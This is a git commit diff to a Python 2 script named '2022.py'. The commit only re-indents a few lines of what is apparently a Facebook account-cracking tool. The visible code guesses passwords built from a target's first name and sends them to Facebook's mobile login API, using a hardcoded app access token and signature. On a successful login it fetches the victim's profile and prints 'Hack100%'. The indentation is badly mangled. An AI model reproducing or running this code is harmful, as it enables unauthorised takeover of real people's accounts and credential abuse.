b9afb4e42d49d06c6bd485705d7e889091ab31da
yocors <67282781+yocors@users.noreply.github.com>
2020-07-15 21:32:59 +0200

    Update 2022.py

--- 2022.py
+++ 2022.py
@@ -506,9 +506,9 @@ def pilih_super():
 				                                                                                                   cekpoint.append(user+pass9)
                                                                                                                                else: 
 											                                           pass10 = b['first_name'] + '0123456789'												
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
-			q = json.load(data)												
-			if 'access_token' in q:
+			                                                                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																   q = json.load(data)												
+			                                                                                                           if 'access_token' in q:
 				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
 				z = json.loads(x.text)
 				print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack100%💉'											
